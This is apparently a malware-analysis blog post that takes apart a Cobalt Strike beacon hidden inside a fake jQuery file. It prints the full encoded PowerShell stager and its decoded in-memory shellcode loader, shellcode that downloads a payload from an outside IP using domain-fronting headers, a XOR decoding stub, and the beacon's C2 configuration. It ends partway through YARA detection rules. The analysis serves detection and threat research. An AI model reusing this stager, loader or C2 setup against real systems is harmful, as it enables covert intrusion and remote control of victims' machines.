---
layout: post
title:  "Hiding a beacon in a jquery"
date:   2018-10-08 10:31:12 -0600
categories: malware, reverse-engineering
---


It's easy to find yourself as a malware researcher looking at some unimaginative samples, which can be good for learning but sometimes you find one that someone actually invested some time into. While ripping this apart I noticed that most of the setup was mimicking a CobaltStrike[[5]] setup from a redteam blog[[4]].

Here we have a pretty obvious suspicious hta file.

![HTA to execute powershell]({{ site.url }}/assets/beacon_in_jquery/hta_to_powershell.png "HTA to execute powershell")

The base64 data looks instantly familiar so let's decode out the next layer:

```powershell
$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("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"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

Looks like this code will decode the base64 chunk and then GZIP decompress it before executing it as another layer of powershell code.

```python
>>> a = "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"
>>> b = base64.b64decode(a)
>>> b[:100]
'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x00\xadWko\xe2J\x12\xfd\x1c~\x85?D\x024\x84\x97\t\x81\x91F\x1a\x1b0\x98\xc1\xbc1\x8f\xdc(j\xbb\xdb\xa6\xa1\xfd\x88\xdd\xc6\x90;\xf3\xdf\xb7l 7\xb3\x93\xd9\x1di\x17\xc9\xa2\xdd\xae\xaa>u\xfat\xb9<#\xfcn\xc6\x03jr\xcd\xc3D\xb8\xd3I\x10R\xcf\x15\xaa\x99\xccm\xdbS\xb9\xf0'
>>> import zlib
>>> c = zlib.decompress(b,31)
>>> c
"Set-StrictMode -Version 2\n\n$DoIt = @'\nfunction func_get_proc_address {\n\tParam ($var_module, $var_procedure)\t\t\n\t$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')\n\t$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))\n\treturn $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))\n}\n\nfunction func_get_delegate_type {\n\tParam (\n\t\t[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,\n\t\t[Parameter(Position = 1)] [Type] $var_return_type = [Void]\n\t)\n\n\t$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])\n\t$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')\n\t$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')\n\n\treturn $var_type_builder.CreateType()\n}\n\n[Byte[]]$var_code = [System.Convert]::FromBase64String('/OiJAAAAYInlMdJki1Iwi1IMi1IUi3IoD7dKJjH/McCsPGF8Aiwgwc8NAcfi8FJXi1IQi0I8AdCLQHiFwHRKAdBQi0gYi1ggAdPjPEmLNIsB1jH/McCswc8NAcc44HX0A334O30kdeJYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS64ZdaG5ldABod2luaVRoTHcmB//VMf9XV1dXV2g6Vnmn/9XphAAAAFsxyVFRagNRUWi7AQAAU1BoV4mfxv/V63BbMdJSaAACYIRSUlJTUlBo61UuO//VicaDw1Ax/1dXav9TVmgtBhh7/9WFwA+EwwEAADH/hfZ0BIn56wloqsXiXf/VicFoRSFeMf/VMf9XagdRVlBot1fgC//VvwAvAAA5x3S3Mf/pkQEAAOnJAQAA6Iv///8vanF1ZXJ5LTMuMy4xLnNsaW0ubWluLmpzAEEWHtAZr9UzlLEMYj6m2TsGjqRuxtH0Pwks0sP2li58d8X+G6D1EQfGPFeQMsoMp1y6B7P1AEFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksKi8qO3E9MC44DQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpIb3N0OiBjb2RlLmpxdWVyeS5jb20NClJlZmVyZXI6IGh0dHA6Ly9jb2RlLmpxdWVyeS5jb20vDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMzsgVHJpZGVudC83LjA7IHJ2OjExLjApIGxpa2UgR2Vja28NCgDdwI5xhQb84gQC6JQNuY93WMxkjJqqWF3FOWnYbJXRfQBo8LWiVv/VakBoABAAAGgAAEAAV2hYpFPl/9WTua8PAAAB2VFTiedXaAAgAABTVmgSloni/9WFwHTGiwcBw4XAdeVYw+ip/f//MzUuMTgyLjMxLjE4MQBpqpvr')\n\n$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))\n$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)\n[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)\n\n$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))\n$var_runme.Invoke([IntPtr]::Zero)\n'@\n\nIf ([IntPtr]::size -eq 8) {\n\tstart-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job\n}\nelse {\n\tIEX $DoIt\n}\n"


```

This looks like a standard powershell script designed for executing code in memory.

```
Set-StrictMode -Version 2

$DoIt = @'
function func_get_proc_address {
	Param ($var_module, $var_procedure)		
	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}

function func_get_delegate_type {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
		[Parameter(Position = 1)] [Type] $var_return_type = [Void]
	)

	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
	$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')

	return $var_type_builder.CreateType()
}

[Byte[]]$var_code = [System.Convert]::FromBase64String('/OiJAAAAYInlMdJki1Iwi1IMi1IUi3IoD7dKJjH/McCsPGF8Aiwgwc8NAcfi8FJXi1IQi0I8AdCLQHiFwHRKAdBQi0gYi1ggAdPjPEmLNIsB1jH/McCswc8NAcc44HX0A334O30kdeJYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS64ZdaG5ldABod2luaVRoTHcmB//VMf9XV1dXV2g6Vnmn/9XphAAAAFsxyVFRagNRUWi7AQAAU1BoV4mfxv/V63BbMdJSaAACYIRSUlJTUlBo61UuO//VicaDw1Ax/1dXav9TVmgtBhh7/9WFwA+EwwEAADH/hfZ0BIn56wloqsXiXf/VicFoRSFeMf/VMf9XagdRVlBot1fgC//VvwAvAAA5x3S3Mf/pkQEAAOnJAQAA6Iv///8vanF1ZXJ5LTMuMy4xLnNsaW0ubWluLmpzAEEWHtAZr9UzlLEMYj6m2TsGjqRuxtH0Pwks0sP2li58d8X+G6D1EQfGPFeQMsoMp1y6B7P1AEFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksKi8qO3E9MC44DQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpIb3N0OiBjb2RlLmpxdWVyeS5jb20NClJlZmVyZXI6IGh0dHA6Ly9jb2RlLmpxdWVyeS5jb20vDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMzsgVHJpZGVudC83LjA7IHJ2OjExLjApIGxpa2UgR2Vja28NCgDdwI5xhQb84gQC6JQNuY93WMxkjJqqWF3FOWnYbJXRfQBo8LWiVv/VakBoABAAAGgAAEAAV2hYpFPl/9WTua8PAAAB2VFTiedXaAAgAABTVmgSloni/9WFwHTGiwcBw4XAdeVYw+ip/f//MzUuMTgyLjMxLjE4MQBpqpvr')

$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)

$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))
$var_runme.Invoke([IntPtr]::Zero)
'@

If ([IntPtr]::size -eq 8) {
	start-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job
}
else {
	IEX $DoIt
}
```

The relevant portion of the next layer will be the base64 chunk.

```
'\xfc\xe8\x89\x00\x00\x00`\x89\xe51\xd2d\x8bR0\x8bR\x0c\x8bR\x14\x8br(\x0f\xb7J&1\xff1\xc0\xac<a|\x02, \xc1\xcf\r\x01\xc7\xe2\xf0RW\x8bR\x10\x8bB<\x01\xd0\x8b@x\x85\xc0tJ\x01\xd0P\x8bH\x18\x8bX \x01\xd3\xe3<I\x8b4\x8b\x01\xd61\xff1\xc0\xac\xc1\xcf\r\x01\xc78\xe0u\xf4\x03}\xf8;}$u\xe2X\x8bX$\x01\xd3f\x8b\x0cK\x8bX\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89D$$[[aYZQ\xff\xe0X_Z\x8b\x12\xeb\x86]hnet\x00hwiniThLw&\x07\xff\xd51\xffWWWWWh:Vy\xa7\xff\xd5\xe9\x84\x00\x00\x00[1\xc9QQj\x03QQh\xbb\x01\x00\x00SPhW\x89\x9f\xc6\xff\xd5\xebp[1\xd2Rh\x00\x02`\x84RRRSRPh\xebU.;\xff\xd5\x89\xc6\x83\xc3P1\xffWWj\xffSVh-\x06\x18{\xff\xd5\x85\xc0\x0f\x84\xc3\x01\x00\x001\xff\x85\xf6t\x04\x89\xf9\xeb\th\xaa\xc5\xe2]\xff\xd5\x89\xc1hE!^1\xff\xd51\xffWj\x07QVPh\xb7W\xe0\x0b\xff\xd5\xbf\x00/\x00\x009\xc7t\xb71\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x8b\xff\xff\xff/jquery-3.3.1.slim.min.js\x00A\x16\x1e\xd0\x19\xaf\xd53\x94\xb1\x0cb>\xa6\xd9;\x06\x8e\xa4n\xc6\xd1\xf4?\t,\xd2\xc3\xf6\x96.|w\xc5\xfe\x1b\xa0\xf5\x11\x07\xc6<W\x902\xca\x0c\xa7\\\xba\x07\xb3\xf5\x00Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nHost: code.jquery.com\r\nReferer: http://code.jquery.com/\r\nAccept-Encoding: gzip, deflate\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\r\n\x00\xdd\xc0\x8eq\x85\x06\xfc\xe2\x04\x02\xe8\x94\r\xb9\x8fwX\xccd\x8c\x9a\xaaX]\xc59i\xd8l\x95\xd1}\x00h\xf0\xb5\xa2V\xff\xd5j@h\x00\x10\x00\x00h\x00\x00@\x00WhX\xa4S\xe5\xff\xd5\x93\xb9\xaf\x0f\x00\x00\x01\xd9QS\x89\xe7Wh\x00 \x00\x00SVh\x12\x96\x89\xe2\xff\xd5\x85\xc0t\xc6\x8b\x07\x01\xc3\x85\xc0u\xe5X\xc3\xe8\xa9\xfd\xff\xff35.182.31.181\x00i\xaa\x9b\xeb'
```

This is code designed to download something, I know that because I recognize the structure of it. If you've never gone through something similar before I recommend loading up the binary file into your favorite disassembler and mapping it out. If you get stuck you can look at the assembly code in Metasploit which should provide some insights[[3]].

The code basically downloads 35.182.31[.]181/jquery-3.3.1.slim.min[.]js but it also goes through the trouble of adding a referer and a fake host HTTP header which is commonly refered to as domain fronting.

Some quick highlights, here is the normal call/pop construct seen in frameworks that generate shellcode for downloading something.

![Shellcode call/pop for URI]({{ site.url }}/assets/beacon_in_jquery/beacon1.png "Shellcode call/pop for URI")

Now that it has that string address, it can add to it to find another.

![Shellcode add to find headers]({{ site.url }}/assets/beacon_in_jquery/beacon2.png "Shellcode add to find headers")

Here we see the HTTP header strings that will be added.

![Shellcode header strings]({{ site.url }}/assets/beacon_in_jquery/beacon3.png "Shellcode header strings")


After downloading the jquery-3.3.1.slim.min.js file we can see it's setup similar to how it was on the blog post, some self decoding data is sitting sandwiched between some javascript code.

```
00000f80: 6774 683b 6e3c 723b 6e2b 2b29 6966 2865  gth;n<r;n++)if(e
00000f90: 5b6e 5d3d 3d3d 7429 7265 7475 726e 206e  [n]===t)return n
00000fa0: 3b72 6574 7572 6e2d 317d 2c50 3d22 0dfc  ;return-1},P="..
00000fb0: e802 0000 00eb 94eb 275a 8b1a 83c2 048b  ........'Z......
00000fc0: 3231 de83 c204 528b 3a31 df89 3a31 fb83  21....R.:1..:1..
00000fd0: c204 83ee 0431 ff39 fe74 02eb ea5b ffe3  .....1.9.t...[..
00000fe0: e8d4 ffff ff17 990f e51b a10c e587 099f  ................
00000ff0: 7517 990f e587 d455 0d87 d455 0ddc 5d8a  u......U...U..].
```

Using Radares rasm utility we can quickly disassemble this data to see that it is a self decoding loop.

```
0x00000000   5               e802000000  call 7
0x00000005   2                     eb94  jmp 0xffffff9b
0x00000007   2                     eb27  jmp 0x30
0x00000009   1                       5a  pop edx
0x0000000a   2                     8b1a  mov ebx, dword [edx]
0x0000000c   3                   83c204  add edx, 4
0x0000000f   2                     8b32  mov esi, dword [edx]
0x00000011   2                     31de  xor esi, ebx
0x00000013   3                   83c204  add edx, 4
0x00000016   1                       52  push edx
0x00000017   2                     8b3a  mov edi, dword [edx]
0x00000019   2                     31df  xor edi, ebx
0x0000001b   2                     893a  mov dword [edx], edi
0x0000001d   2                     31fb  xor ebx, edi
0x0000001f   3                   83c204  add edx, 4
0x00000022   3                   83ee04  sub esi, 4
0x00000025   2                     31ff  xor edi, edi
0x00000027   2                     39fe  cmp esi, edi
0x00000029   2                     7402  je 0x2d
0x0000002b   2                     ebea  jmp 0x17
0x0000002d   1                       5b  pop ebx
0x0000002e   2                     ffe3  jmp ebx
0x00000030   5               e8d4ffffff  call 9
0x00000035   1                       17  pop ss
```

The call 7 -> jmp 0x30 -> call 9 chain is ending with a 'pop edx' which will have the address of 0x35 which is the beginning of the encoded data. After that the first DWORD value is the XOR key and the following DWORD is the XORd length of data to be decoded and then begins the XOR encoded data. It's not a straight XOR however ass you can see after each value is XORd the decoded DWORD is then XORd with the XOR key.

We have two things from this; we can decode the next layer and we can signature on this as I'm pretty sure this type of data is not normally inside a jquery file.

Let's decode out what is inside.
```python
>>> for i in range(len(t2)/4):
...   temp = struct.unpack_from('<I', t2[i*4:])[0]
...   temp ^= key
...   out += struct.pack('<I', temp)
...   key ^= temp
... 
>>> out[:100]
'\x90\x90\x90\x90\x90\x90\x90\x90\x90MZ\xe8\x00\x00\x00\x00[\x89\xdfREU\x89\xe5\x81\xc3(\x83\x00\x00\xff\xd3h\xf0\xb5\xa2Vh\x04\x00\x00\x00W\xff\xd0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf0\x00\x00\x00i\xbf\x88\xe0\xd3\xab\xab\xe9o5\rX\x91N\xe7~\xa0`!o\x03\x106v\xf5\x8a\xcd'
``` 

So the decoded data is a MZ that has had it's headers turned into shellcode for executing itself, this is a common thing you will find with CobaltStrike beacons designed to be loaded using the Reflective loader technique.

Here we can see the nop sled into the call then a hardcoded offset is added so if you're wanting to map this out in a disassembler you can calculate your entrypoint of execution based on the below code.
```
0x00000000   1                       90  nop
0x00000001   1                       90  nop
0x00000002   1                       90  nop
0x00000003   1                       90  nop
0x00000004   1                       90  nop
0x00000005   1                       90  nop
0x00000006   1                       90  nop
0x00000007   1                       90  nop
0x00000008   1                       90  nop
0x00000009   1                       4d  dec ebp
0x0000000a   1                       5a  pop edx
0x0000000b   5               e800000000  call 0x10
0x00000010   1                       5b  pop ebx
0x00000011   2                     89df  mov edi, ebx
0x00000013   1                       52  push edx
0x00000014   1                       45  inc ebp
0x00000015   1                       55  push ebp
0x00000016   2                     89e5  mov ebp, esp
0x00000018   6             81c328830000  add ebx, 0x8328
0x0000001e   2                     ffd3  call ebx
```


Partial beacon config:
```
SPAWNTO_X64: %windir%\sysnative\svchost.exe -k netsvcs
SLEEPTIME: 50000
PROXY_BEHAVIOR: 2
DOMAINS: 35.182.31.181,/jquery-3.3.1.min.js,jquery.amazoncdn.org,/jquery-3.3.1.min.js
SUBMITURI: /jquery-3.3.2.min.js
USERAGENT: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko
PORT: 443
SPAWNTO_X86: %windir%\syswow64\svchost.exe -k netsvcs
C2_REQUEST: [('_HEADER', 0, 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'), ('_HEADER', 0, 'Host: code.jquery.com'), ('_HEADER', 0, 'Referer: http://code.jquery.com/'), ('_HEADER', 0, 'Accept-Encoding: gzip, deflate'), ('BUILD', ('BASE64URL',)), ('HEADER', 0, 'Cookie')]
MAXDNS: 255
C2_CHUNK_POST: 0
C2_POSTREQ: [('_HEADER', 0, 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'), ('_HEADER', 0, 'Host: code.jquery.com'), ('_HEADER', 0, 'Referer: http://code.jquery.com/'), ('_HEADER', 0, 'Accept-Encoding: gzip, deflate'))]
PUBKEY: 30819f300d06092a864886f70d010101050003818d0030818902818100e5fa7ef5dfc3b941b00d53fbadd578a71d8bc8e0d228a33bc859532a76e91b307bfcefc17c2680ef49441567f1ee40132114ad254543ccecebf64842be5b802e0788b4ee436e7ba1f6435bbf69a729add2ea280c5213338d0f8c655ea242588f24a1363d579b773efd40991007bd0dfe2f82a7745e38bdbc713046522ee6cf8b0203010001
PIPENAME: \\%s\pipe\mojo.5688.8052.183894939787088877%x
```

So let's revisit that decoding loop, we can create a YARA rule to detect it in a generic sense:
```
rule self_decoding_code
{
strings:
$a = {5? 8b ?? 83 ?? 04 8b ?? 31 ?? 83 ?? 04 5? 8b ?? 31 ?? 8?}
condition:
all of them
}
```

This could be interesting for hunting but what detection of this code inside a file pretending to be jquery? For that we can simply add one or more strings.

```
rule sc_in_jquery
{
strings:
$a = {5? 8b ?? 83 ?? 04 8b ?? 31 ?? 83 ?? 04 5? 8b ?? 31 ?? 8?}
